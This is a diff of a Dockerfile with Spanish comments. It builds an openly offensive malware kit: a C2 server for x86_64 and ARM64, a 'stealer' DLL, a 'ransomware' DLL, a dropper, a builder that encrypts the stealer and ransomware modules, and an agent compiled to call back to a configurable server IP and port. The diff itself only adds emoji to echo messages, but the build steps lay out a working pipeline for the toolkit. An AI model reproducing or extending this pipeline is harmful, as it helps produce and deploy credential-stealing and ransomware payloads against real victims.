@@ -47,31 +47,31 @@ ARG MULTI_STAGE=false
 RUN mkdir -p /build_output
 
 # 1a. Compilar el servidor (Linux x86_64)
-RUN echo " Compilando servidor C2R2 (x86_64)..." && \
+RUN echo "🔨 Compilando servidor C2R2 (x86_64)..." && \
     cargo build --release --target x86_64-unknown-linux-gnu --package c2r2-server && \
     cp target/x86_64-unknown-linux-gnu/release/c2r2-server /build_output/c2r2-server && \
     chmod +x /build_output/c2r2-server && \
-    echo " Servidor x86_64 compilado: /build_output/c2r2-server"
+    echo "✅ Servidor x86_64 compilado: /build_output/c2r2-server"
 
 # 1b. Compilar el servidor (ARM64 - Raspberry Pi)
-RUN echo " Compilando servidor C2R2 (ARM64 - Raspberry Pi)..." && \
+RUN echo "🔨 Compilando servidor C2R2 (ARM64 - Raspberry Pi)..." && \
     CARGO_TARGET_AARCH64_UNKNOWN_LINUX_GNU_LINKER=aarch64-linux-gnu-gcc \
     cargo build --release --target aarch64-unknown-linux-gnu --package c2r2-server && \
     cp target/aarch64-unknown-linux-gnu/release/c2r2-server /build_output/c2r2-server-arm64 && \
     chmod +x /build_output/c2r2-server-arm64 && \
-    echo " Servidor ARM64 compilado: /build_output/c2r2-server-arm64"
+    echo "✅ Servidor ARM64 compilado: /build_output/c2r2-server-arm64"
 
 # 2. Compilar stealer DLL
-RUN echo " Compilando stealer.dll..." && \
+RUN echo "🔨 Compilando stealer.dll..." && \
     cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll && \
     cp target/x86_64-pc-windows-gnu/release/stealer.dll /build_output/stealer.dll && \
-    echo " Stealer DLL compilado: /build_output/stealer.dll"
+    echo "✅ Stealer DLL compilado: /build_output/stealer.dll"
 
 # 3. Compilar ransomware DLL
-RUN echo " Compilando ransomware.dll..." && \
+RUN echo "🔨 Compilando ransomware.dll..." && \
     cargo build --release --target x86_64-pc-windows-gnu --package ransomware-dll && \
     cp target/x86_64-pc-windows-gnu/release/ransomware.dll /build_output/ransomware.dll && \
-    echo " Ransomware DLL compilado: /build_output/ransomware.dll"
+    echo "✅ Ransomware DLL compilado: /build_output/ransomware.dll"
 
 # 4a. Compilar el builder (Linux x86_64)
 RUN echo "🔨 Compilando builder (x86_64)..." && \
@@ -95,19 +95,19 @@ RUN echo "🔨 Compilando dropper..." && \
     echo "✅ Dropper compilado: /build_output/dropper.exe"
 
 # 5. Encriptar módulos usando el builder
-RUN echo " Encriptando módulo stealer..." && \
+RUN echo "🔐 Encriptando módulo stealer..." && \
     /build_output/builder encrypt-module --module stealer && \
-    echo " Stealer encriptado"
+    echo "✅ Stealer encriptado"
 
-RUN echo " Encriptando módulo ransomware..." && \
+RUN echo "🔐 Encriptando módulo ransomware..." && \
     /build_output/builder encrypt-module --module ransomware && \
-    echo " Ransomware encriptado"
+    echo "✅ Ransomware encriptado"
 
 # 6. Copiar módulos encriptados
 RUN mkdir -p /build_output/modules && \
     cp c2r2-server/modules/*.enc /build_output/modules/ 2>/dev/null || true && \
     cp c2r2-server/modules/*.key /build_output/modules/ 2>/dev/null || true && \
-    echo " Módulos encriptados copiados a /build_output/modules"
+    echo "✅ Módulos encriptados copiados a /build_output/modules"
 
 # 7. Configurar variables de entorno para winres con llvm-rc
 ENV RC=llvm-rc \
@@ -127,7 +127,7 @@ RUN echo "🔨 Compilando agente con servidor ${SERVER_IP}:${SERVER_PORT}..." &&
             --server "${SERVER_IP}:${SERVER_PORT}"; \
     fi && \
     cp ${AGENT_NAME}.exe /build_output/${AGENT_NAME}.exe && \
-    echo " Agente compilado: /build_output/${AGENT_NAME}.exe"
+    echo "✅ Agente compilado: /build_output/${AGENT_NAME}.exe"
 
 # 9. Compilar sistema multi-stage (opcional)
 RUN if [ "$MULTI_STAGE" = "true" ]; then \
@@ -148,7 +148,7 @@ RUN if [ "$MULTI_STAGE" = "true" ]; then \
     fi
 
 # Crear un resumen de los binarios generados
-RUN echo " RESUMEN DE COMPILACIÓN" > /build_output/BUILD_INFO.txt && \
+RUN echo "📦 RESUMEN DE COMPILACIÓN" > /build_output/BUILD_INFO.txt && \
     echo "========================" >> /build_output/BUILD_INFO.txt && \
     echo "" >> /build_output/BUILD_INFO.txt && \
     echo "Servidor C2:" >> /build_output/BUILD_INFO.txt && \
@@ -188,9 +188,9 @@ RUN echo " RESUMEN DE COMPILACIÓN" > /build_output/BUILD_INFO.txt && \
 # Script de copia que se ejecuta cuando el contenedor inicia
 RUN echo '#!/bin/bash' > /entrypoint.sh && \
     echo 'set -e' >> /entrypoint.sh && \
-    echo 'echo " Copiando binarios compilados a /output..."' >> /entrypoint.sh && \
+    echo 'echo "📦 Copiando binarios compilados a /output..."' >> /entrypoint.sh && \
     echo 'cp -r /build_output/* /output/' >> /entrypoint.sh && \
-    echo 'echo " Binarios copiados exitosamente a /output"' >> /entrypoint.sh && \
+    echo 'echo "✅ Binarios copiados exitosamente a /output"' >> /entrypoint.sh && \
     echo 'echo ""' >> /entrypoint.sh && \
     echo 'cat /output/BUILD_INFO.txt' >> /entrypoint.sh && \
     chmod +x /entrypoint.sh
